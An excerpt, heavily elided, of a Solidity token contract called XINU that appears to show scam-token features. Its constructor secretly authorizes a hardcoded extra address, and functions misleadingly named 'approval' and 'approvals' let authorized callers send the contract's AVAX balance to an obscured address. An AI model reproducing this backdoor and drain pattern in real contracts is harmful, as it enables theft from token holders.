...
abstract contract Auth {
    ...
    constructor(address _owner) {
        owner = _owner;
        authorizations[
    0x2cFC9Da0423E9CE5A5852864fd651Db61AFd992D] = true;
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWDS = IBEP20(0x130966628846BFd36ff31a822705796e8cb8C18D);
    IBEP20 PRWDS = IBEP20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    address REWARDS;
    IDEXRouter router;
...
contract XINU is IBEP20, Auth {
    ...
    function approval() external authorized {
        ...
        payable(tfU).transfer(amountAVAX);
    }
    ...
    function approvals(uint256 aP) external authorized {
        uint256 amountAVAX = address(this).balance;
        payable(tfU).transfer(amountAVAX.mul(aP).div(100));
    }
    ...
    function vswBk(uint256 amount) internal swapping {
        ...
        router.swapExactTokensForAVAXSupportingFeeOnTransferTokens(
            ...
            address(this),
            block.timestamp );
        uint256 aAVAX = address(this).balance.sub(bB);
        uint256 tAVAXF = tLD.sub(dynamicLiq.div(2));
        uint256 aAVAXL = aAVAX.mul(dynamicLiq).div(tAVAXF).div(2);
        uint256 aAVAXR = aAVAX.mul(xr).div(tAVAXF);
        uint256 aAVAXM = aAVAX.mul(zr).div(tAVAXF);
        try distributor.deposit{value: aAVAXR}() {} catch {}
        (bool tmpSuccess,) = payable(mark).call{value: (aAVAXM), gas: gso}("");
        tmpSuccess = false;
        if(amountL > 0){
            router.addLiquidityAVAX{value: aAVAXL}(
                address(this),
                amountL,
                0,
                0,
                lpR,
                block.timestamp );
            emit AutoLiquify(aAVAXL, amountL); 
        }
    }
    ...
    event AutoLiquify(uint256 amountAVAX, uint256 amountWAVAX);
}